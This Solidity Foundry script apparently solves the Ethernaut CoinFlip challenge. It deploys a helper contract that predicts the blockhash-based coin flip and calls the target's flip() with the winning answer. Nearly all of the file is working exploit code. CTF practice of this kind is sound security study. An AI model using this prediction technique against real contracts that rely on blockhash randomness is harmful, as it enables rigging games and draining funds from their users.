// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

// A helper contract is deployed to get same block.number and blockhash, instead of relying on forked value.
contract CoinFlipAttacker {
    uint256 lastHash;

	function attack(address _target) external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;

		ICoinFlip(_target).flip(side);
	}
}

contract CoinFlipSolve is Script {
	function run() public {
		// specify the target 
		address instanceAddress = vm.envAddress("INSTANCE_ADDRESS");

		vm.startBroadcast();
		// deploy our helper attackerContract
		CoinFlipAttacker attacker = new CoinFlipAttacker();
		console2.log("Attacker contract at address ", address(attacker));
		ICoinFlip target = ICoinFlip(instanceAddress);

		// Call attack
		console2.log("Block ", block.number, ", ConsecutiveWins = ", target.consecutiveWins());		
		attacker.attack(instanceAddress);
		console2.log("Block ", block.number, ", ConsecutiveWins = ", target.consecutiveWins());		

		vm.stopBroadcast();
	}
}
